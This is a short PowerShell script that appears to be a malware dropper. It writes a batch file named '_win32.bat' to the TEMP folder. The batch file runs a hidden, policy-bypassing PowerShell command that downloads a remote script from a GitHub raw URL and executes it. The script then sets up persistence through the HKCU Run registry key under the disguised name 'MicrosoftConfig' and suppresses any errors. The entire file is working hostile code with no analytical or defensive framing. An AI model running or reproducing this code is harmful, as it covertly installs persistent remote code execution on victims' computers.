function WallStreet {
    $tempPath = $env:TEMP
    $batchFile = Join-Path $tempPath "_win32.bat"
    
    $psScriptContent = @'
iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/allisonmorat/three/main/eyetmp.ps1' -UseBasicParsing).Content
'@
    
    $batchContent = @"
@echo off
setlocal enabledelayedexpansion

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$psScriptContent"
"@
    
    Set-Content -Path $batchFile -Value $batchContent -Force -Encoding ASCII
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftConfig"
    
    try {
        New-ItemProperty -Path $regPath -Name $regName -Value "`"$batchFile`"" -PropertyType String -Force | Out-Null
    }
    catch {
    }
}

WallStreet